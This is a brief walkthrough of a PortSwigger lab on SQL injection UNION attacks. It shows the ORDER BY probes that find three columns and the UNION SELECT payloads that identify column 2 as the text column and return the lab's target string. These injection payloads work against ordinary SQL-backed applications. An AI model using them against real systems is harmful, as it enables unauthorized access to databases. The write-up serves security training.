# Lab: SQL Injection UNION attack – Finding a column containing text - [Link](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

---

### Goal:

Make the database retrieve the string: `'ZUA5jF'`
You must find **which column** can hold text (i.e., string data type).

---

## Step-by-step:

### 1. Determine number of columns

Test with `ORDER BY` until it breaks:

```sql
' ORDER BY 1--        → OK  
' ORDER BY 2--        → OK  
' ORDER BY 3--        → OK  
' ORDER BY 4--        → ERROR  
```

Means: **3 columns**


### 2. Determine data types in each column (to find which one supports **text**)

Try:

```sql
' UNION SELECT NULL,NULL,NULL--        → OK  
' UNION SELECT 'a',NULL,NULL--         → ERROR  
' UNION SELECT NULL,'ZUA5jF',NULL--    → OK — Challenge solved
```

Column **2** accepts text
The lab was automatically solved when the correct string was retrieved.
